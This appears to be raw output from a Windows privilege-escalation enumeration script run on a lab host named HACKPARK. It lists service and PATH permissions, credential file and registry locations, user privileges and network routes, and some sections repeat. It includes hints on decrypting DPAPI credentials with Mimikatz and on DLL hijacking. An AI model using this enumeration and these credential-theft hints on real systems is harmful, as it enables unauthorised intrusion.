 C:\Windows\servicing\TrustedInstaller.exe                                                                       
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)                                        
                                                                                                                 
WindowsScheduler                                                                                                 
 C:\PROGRA~2\SYSTEM~1\WService.exe                                                                               
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)                                                                
                                  BUILTIN\Administrators:(I)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] DLL HIJACKING in PATHenv variable                                                                            
   [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations         
   [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking            
C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)                                                              
                    BUILTIN\Administrators:(M)                                                                   
                    BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                       
                                                                                                                 
C:\Windows NT SERVICE\TrustedInstaller:(F)                                                                       
           BUILTIN\Administrators:(M)                                                                            
           BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                                
                                                                                                                 
C:\Windows\System32\Wbem NT SERVICE\TrustedInstaller:(F)                                                         
                         BUILTIN\Administrators:(M)                                                              
                         BUILTIN\Administrators:(OI)(CI)(IO)(F)                                                  
                                                                                                                 
                                                                                                                 
[*] CREDENTIALS                                                                                                  
                                                                                                                 
 [+] WINDOWS VAULT                                                                                               
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-vault            
                                                                                                                 
Currently stored credentials:                                                                                    
                                                                                                                 
* NONE *                                                                                                         
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
                                                                                                                 
    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect                                          
                                                                                                                 
                                                                                                                 
Mode                LastWriteTime     Length Name                                                                
----                -------------     ------ ----                                                                
d---s         9/27/2022  11:27 AM            S-1-5-21-141259258-288879770-38949                                  
                                             83326-500                                                           
                                                                                                                 
                                                                                                                 
 [+] DPAPI MASTER KEYS                                                                                           
   [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt                              
   [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module         
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Roaming\Microsoft\Credentials\                                     
                                                                                                                 
The system cannot find the batch label specified - T_Progress                                                    
                                                                                                                 
Looking inside C:\Users\Administrator\AppData\Local\Microsoft\Credentials\                                       
                                                                                                                 
                                                                                                                 
 [+] Unattended files                                                                                            
                                                                                                                 
 [+] SAM and SYSTEM backups                                                                                      
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
   (((((((((((/* ******************/####### .(. ((((((                                                           
   ((((((..******************/@@@@@/***/###### /((((((                                                           
   ,,..**********************@@@@@@@@@@(***,#### ../(((((                                                        
   , ,**********************#@@@@@#@@@@*********##((/ /((((                                                      
   ..(((##########*********/#@@@@@@@@@/*************,,..((((                                                     
   .(((################(/******/@@@@@#****************.. /((                                                     
   .((########################(/************************..*(                                                     
   .((#############################(/********************.,(                                                     
                                                                                                                 
Interface: 10.10.97.210 --- 0xe                                                                                  
  Internet Address      Physical Address      Type                                                               
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic                                                            
  10.10.255.255         ff-ff-ff-ff-ff-ff     static                                                             
  169.254.169.254       02-c8-85-b5-5a-aa     dynamic                                                            
  224.0.0.22            01-00-5e-00-00-16     static                                                             
  224.0.0.252           01-00-5e-00-00-fc     static                                                             
  255.255.255.255       ff-ff-ff-ff-ff-ff     static                                                             
                                                                                                                 
C:\inetpub\history\CFGHISTORY_0000000001\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000001\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000002\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000002\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000003\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000003\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000004\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000004\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000005\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000005\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000006\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000006\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000007\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000007\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000008\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000008\applicationHost.config                                                  
C:\inetpub\history\CFGHISTORY_0000000009\administration.config                                                   
C:\inetpub\history\CFGHISTORY_0000000009\applicationHost.config                                                  
C:\inetpub\temp\appPools\Blog\Blog.config                                                                        
C:\inetpub\temp\appPools\DefaultAppPool\DefaultAppPool.config                                                    
C:\inetpub\wwwroot\packages.config                                                                               
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\change-password-success.aspx                                                          
C:\inetpub\wwwroot\Account\change-password.aspx                                                                  
C:\inetpub\wwwroot\Account\password-retrieval.aspx                                                               
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\Content\images\blog\icon-pass.svg                                                             
C:\inetpub\wwwroot\setup\Web.config                                                                              
C:\inetpub\wwwroot\setup\MySQL\MySQLWeb.Config                                                                   
C:\inetpub\wwwroot\setup\MySQL\Archive\MySQLWeb.Config                                                           
C:\inetpub\wwwroot\setup\SQLite\SQLiteWeb.Config                                                                 
C:\inetpub\wwwroot\setup\SQLServer\DbWeb.Config                                                                  
C:\inetpub\wwwroot\setup\SQL_CE\SQL_CE_Web.Config                                                                
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe                                                    
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\ec2config-cli.exe.config                                                
C:\Program Files\Amazon\Ec2ConfigService\ec2config-cli.log4net.config                                            
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe.config                                                    
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigMonitor.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigMonitor.log4net.config                                         
C:\Program Files\Amazon\Ec2ConfigService\Ec2ConfigServiceSettings.exe.config                                     
C:\Program Files\Amazon\Ec2ConfigService\Ec2Runas.exe.config                                                     
C:\Program Files\Amazon\Ec2ConfigService\Ec2WallpaperInfo.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\log4net.config                                                          
C:\Program Files\Amazon\Ec2ConfigService\ScramblePassword.exe.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Plugins\log4net.config                                                  
C:\Program Files\Amazon\Ec2ConfigService\Ssm\log4net.config                                                      
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\AWS.EC2.Windows.CloudWatch.Configuration.dll               
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\log4net.config                                             
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\Microsoft.Practices.Unity.Configuration.dll                
C:\Program Files\Amazon\Ec2ConfigService\Ssm\Packages\Microsoft.Practices.Unity.Interception.Configuration.dll   
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.CloudWatch.exe.config                                      
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.CloudWatch.log4net.config                                  
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\AWS.EC2.Windows.CloudWatch.Configuration.dll                   
C:\Program Files\Amazon\SSM\Plugins\awsCloudWatch\Microsoft.Practices.Unity.Configuration.dll                    
C:\Program Files\Amazon\SSM\Plugins\awsDomainJoin\AWS.DomainJoin.exe.config                                      
C:\Program Files\Amazon\SSM\Plugins\awsDomainJoin\log4net.config                                                 
C:\Program Files\Amazon\Xentools\Installer.exe.config                                                            
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Confirm-Password.ps1                                     
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\New-RandomPassword.ps1                                   
C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Scripts\Send-AdminCredentials.ps1                                
C:\ProgramData\Amazon\EC2-Windows\Launch\Settings\Ec2LaunchSettings.exe.config                                   
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1                                
C:\Users\Administrator\AppData\Local\Microsoft_Corporation\ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj\6.3.0.0\user.config                                                                                      
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Confirm-Password.ps1                                 
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\New-RandomPassword.ps1                               
C:\Users\All Users\Amazon\EC2-Windows\Launch\Module\Scripts\Send-AdminCredentials.ps1                            
C:\Users\All Users\Amazon\EC2-Windows\Launch\Settings\Ec2LaunchSettings.exe.config                               
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Randomize-LocalAdminPassword.ps1                            
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
===========================================================================                                      
Interface List                                                                                                   
 14...02 be 3b 95 69 49 ......AWS PV Network Device #0                                                           
  1...........................Software Loopback Interface 1                                                      
 13...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter                                                           
===========================================================================                                      
                                                                                                                 
IPv4 Route Table                                                                                                 
===========================================================================                                      
Active Routes:                                                                                                   
Network Destination        Netmask          Gateway       Interface  Metric                                      
          0.0.0.0          0.0.0.0        10.10.0.1     10.10.97.210     10                                      
        10.10.0.0      255.255.0.0         On-link      10.10.97.210    266                                      
     10.10.97.210  255.255.255.255         On-link      10.10.97.210    266                                      
    10.10.255.255  255.255.255.255         On-link      10.10.97.210    266                                      
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306                                      
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306                                      
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                      
  169.254.169.123  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.249  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.250  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.251  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.253  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
  169.254.169.254  255.255.255.255        10.10.0.1     10.10.97.210     10                                      
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306                                      
        224.0.0.0        240.0.0.0         On-link      10.10.97.210    266                                      
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306                                      
  255.255.255.255  255.255.255.255         On-link      10.10.97.210    266                                      
===========================================================================                                      
Persistent Routes:                                                                                               
  None                                                                                                           
                                                                                                                 
IPv6 Route Table                                                                                                 
===========================================================================                                      
Active Routes:                                                                                                   
 If Metric Network Destination      Gateway                                                                      
  1    306 ::1/128                  On-link                                                                      
 14    266 fe80::/64                On-link                                                                      
 14    266 fe80::b45b:96ae:4248:215/128                                                                          
                                    On-link                                                                      
  1    306 ff00::/8                 On-link                                                                      
 14    266 ff00::/8                 On-link                                                                      
===========================================================================                                      
Persistent Routes:                                                                                               
  None                                                                                                           
                                                                                                                 
 [+] Hosts file                                                                                                  
                                                                                                                 
                                                                                                                 
 [+] McAffee SiteList.xml                                                                                        
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                                   
                                                                                                                 
Looking inside HKCU\Software\TightVNC\Server                                                                     
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                          
Looking inside HKCU\Software\OpenSSH\Agent\Keys                                                                  
C:\ProgramData\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                    
C:\ProgramData\Amazon\EC2Launch\sysprep\unattend.xml                                                             
C:\Users\All Users\Amazon\EC2-Windows\Launch\Sysprep\Unattend.xml                                                
C:\Users\All Users\Amazon\EC2Launch\sysprep\unattend.xml                                                         
C:\Windows\Panther\setupinfo                                                                                     
C:\Windows\System32\inetsrv\appcmd.exe                                                                           
C:\Windows\SysWOW64\inetsrv\appcmd.exe                                                                           
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_64e8a179c6f2a167\ScheduledTasks.xml   
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_824aabe06aee1705\ScheduledTasks.xml    
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_6.3.9600.16384_none_8bc96e4517571480\ntds.dit                                                                                                   
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_01a7d2cf88c95dc0\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_01dac51388a3a832\appcmd.exe                                                                                                    
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_6.3.9600.16384_en-us_7427d216367d8d3f\certnew.cer                                                                                                  
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_6.3.9600.16384_none_6f3d4bcbfb536362\ScheduledTasks.xml   
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_6.3.9600.16384_none_8c9f56329f4ed900\ScheduledTasks.xml    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.16384_none_0bfc7d21bd2a1fbb\appcmd.exe                                                                                                    
C:\Windows\WinSxS\wow64_microsoft-windows-iis-sharedlibraries_31bf3856ad364e35_6.3.9600.17031_none_0c2f6f65bd046a2d\appcmd.exe                                                                                                    
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190803.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190804.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex190805.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex201002.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC1\u_ex220927.log                                                                   
C:\inetpub\logs\LogFiles\W3SVC2\u_ex190803.log                                                                   
C:\inetpub\wwwroot\Web.config                                                                                    
C:\inetpub\wwwroot\Account\Web.Config                                                                            
C:\inetpub\wwwroot\admin\Web.Config                                                                              
C:\inetpub\wwwroot\admin\app\editor\Web.Config                                                                   
C:\inetpub\wwwroot\setup\Web.config                                                                              
                                                                                                                 
---                                                                                                              
Scan complete.                                                                                                   
                                                                                                                 
 [+] WIFI                                                                                                        
[*] BASIC USER INFO                                                                                              
   [i] Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebbugPrivilege           
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#users-and-groups         
                                                                                                                 
 [+] CURRENT USER                                                                                                
User name                    Administrator                                                                       
Full Name                                                                                                        
Comment                      Built-in account for administering the computer/domain                              
User's comment                                                                                                   
Country/region code          000 (System Default)                                                                
Account active               Yes                                                                                 
Account expires              Never                                                                               
                                                                                                                 
Password last set            8/3/2019 10:43:23 AM                                                                
Password expires             9/14/2019 10:43:23 AM                                                               
Password changeable          8/3/2019 10:43:23 AM                                                                
Password required            Yes                                                                                 
User may change password     Yes                                                                                 
                                                                                                                 
Workstations allowed         All                                                                                 
Logon script                                                                                                     
User profile                                                                                                     
Home directory                                                                                                   
Last logon                   9/27/2022 9:48:46 AM                                                                
                                                                                                                 
Logon hours allowed          All                                                                                 
                                                                                                                 
Local Group Memberships      *Administrators                                                                     
Global Group memberships     *None                                                                               
The command completed successfully.                                                                              
                                                                                                                 
The request will be processed at a domain controller for domain WORKGROUP.                                       
                                                                                                                 
                                                                                                                 
USER INFORMATION                                                                                                 
----------------                                                                                                 
                                                                                                                 
User Name              SID                                                                                       
====================== ===========================================                                               
hackpark\administrator S-1-5-21-141259258-288879770-3894983326-500                                               
                                                                                                                 
                                                                                                                 
GROUP INFORMATION                                                                                                
-----------------                                                                                                
                                                                                                                 
Group Name                                                    Type             SID          Attributes                                                                                                                            
============================================================= ================ ============ ===============================================================                                                                       
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group                                                                                    
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner                                                                       
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                                                    
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                                                    
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                                                    
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                    
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                                                                                       
                                                                                                                 
                                                                                                                 
PRIVILEGES INFORMATION                                                                                           
----------------------                                                                                           
                                                                                                                 
Privilege Name                  Description                               State                                  
=============================== ========================================= ========                               
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled                                
SeSecurityPrivilege             Manage auditing and security log          Disabled                               
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled                                
SeLoadDriverPrivilege           Load and unload device drivers            Disabled                               
SeSystemProfilePrivilege        Profile system performance                Disabled                               
SeSystemtimePrivilege           Change the system time                    Disabled                               
SeProfileSingleProcessPrivilege Profile single process                    Disabled                               
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled                               
SeCreatePagefilePrivilege       Create a pagefile                         Disabled                               
SeBackupPrivilege               Back up files and directories             Disabled                               
SeRestorePrivilege              Restore files and directories             Disabled                               
SeShutdownPrivilege             Shut down the system                      Disabled                               
SeDebugPrivilege                Debug programs                            Enabled                                
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled                               
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled                                
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled                               
SeUndockPrivilege               Remove computer from docking station      Disabled                               
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled                               
SeImpersonatePrivilege          Impersonate a client after authentication Enabled                                
SeCreateGlobalPrivilege         Create global objects                     Enabled                                
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled                               
SeTimeZonePrivilege             Change the time zone                      Disabled                               
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled                               
                                                                                                                 
ERROR: Unable to get user claims information.                                                                    
                                                                                                                 
 [+] USERS                                                                                                       
                                                                                                                 
User accounts for \\HACKPARK                                                                                     
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator            Guest                    jeff                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] GROUPS                                                                                                      
                                                                                                                 
Aliases for \\HACKPARK                                                                                           
                                                                                                                 
-------------------------------------------------------------------------------                                  
*Access Control Assistance Operators                                                                             
*Administrators                                                                                                  
*Backup Operators                                                                                                
*Certificate Service DCOM Access                                                                                 
*Cryptographic Operators                                                                                         
*Distributed COM Users                                                                                           
*Event Log Readers                                                                                               
*Guests                                                                                                          
*Hyper-V Administrators                                                                                          
*IIS_IUSRS                                                                                                       
*Network Configuration Operators                                                                                 
*Performance Log Users                                                                                           
*Performance Monitor Users                                                                                       
*Power Users                                                                                                     
*Print Operators                                                                                                 
*RDS Endpoint Servers                                                                                            
*RDS Management Servers                                                                                          
*RDS Remote Access Servers                                                                                       
*Remote Desktop Users                                                                                            
*Remote Management Users                                                                                         
*Replicator                                                                                                      
*Users                                                                                                           
*WinRMRemoteWMIUsers__                                                                                           
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] ADMINISTRATORS GROUPS                                                                                       
Alias name     Administrators                                                                                    
Comment        Administrators have complete and unrestricted access to the computer/domain                       
                                                                                                                 
Members                                                                                                          
                                                                                                                 
-------------------------------------------------------------------------------                                  
Administrator                                                                                                    
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] CURRENT LOGGED USERS                                                                                        
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                      
>administrator         console             1  Active      none   9/27/2022 9:48 AM                               
                                                                                                                 
 [+] Kerberos Tickets                                                                                            
                                                                                                                 
Current LogonId is 0:0x256d9                                                                                     
                                                                                                                 
Cached Tickets: (0)                                                                                              
                                                                                                                 
 [+] CURRENT CLIPBOARD                                                                                           
   [i] Any password inside the clipboard?                                                                        
                                                                                                                 
[*] SERVICE VULNERABILITIES                                                                                      
                                                                                                                 
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 0E97-C552                                                                               
                                                                                                                 
 [+] GPP Password                                                                                                
                                                                                                                 
 [+] Cloud Credentials                                                                                           
                                                                                                                 
 [+] AppCmd                                                                                                      
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe               
C:\Windows\system32\inetsrv\appcmd.exe exists.                                                                   
                                                                                                                 
 [+] Files in registry that may contain credentials                                                              
   [i] Searching specific files that may contains credentials.                                                   
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files 
Looking inside HKCU\Software\ORL\WinVNC3\Password                                                                
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                              
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                                        
    DefaultDomainName    REG_SZ                                                                                  
    DefaultUserName    REG_SZ                                                                                    
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                                       
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                             
                                                                                                                 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                             
